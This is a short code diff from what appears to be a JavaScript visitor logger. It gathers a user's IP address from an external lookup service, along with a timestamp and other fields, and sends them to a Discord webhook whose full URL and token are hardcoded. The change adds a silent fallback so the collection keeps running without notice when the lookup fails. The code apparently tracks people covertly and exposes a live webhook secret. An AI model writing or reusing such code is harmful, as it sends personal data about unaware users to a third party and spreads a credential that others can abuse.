@@ -19,8 +19,19 @@
     const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465917225818132575/eaIqusPShhtUlsTUlwmoZurmLcyFfqWrDsWSXe78jubMr4MSvFrR7siYeFWlIQ_aaqHm";
 
 async function getUserInfo() {
-  const ipRes = await fetch("https://ipinfo.io/json");
-  const { ip } = await ipRes.json();
+  let ip = "unavailable";
+
+  try {
+    const res = await fetch("https://api64.ipify.org?format=json", {
+      cache: "no-store"
+    });
+    if (res.ok) {
+      const data = await res.json();
+      ip = data.ip || ip;
+    }
+  } catch {
+    // silently ignore IP failure
+  }
 
   return {
     ip,
@@ -32,7 +43,6 @@ async function getUserInfo() {
     timestamp: new Date().toISOString()
   };
 }
-
 async function sendToDiscord(data) {
   const content = Object.entries(data)
     .map(([k, v]) => `**${k}**: ${v}`)
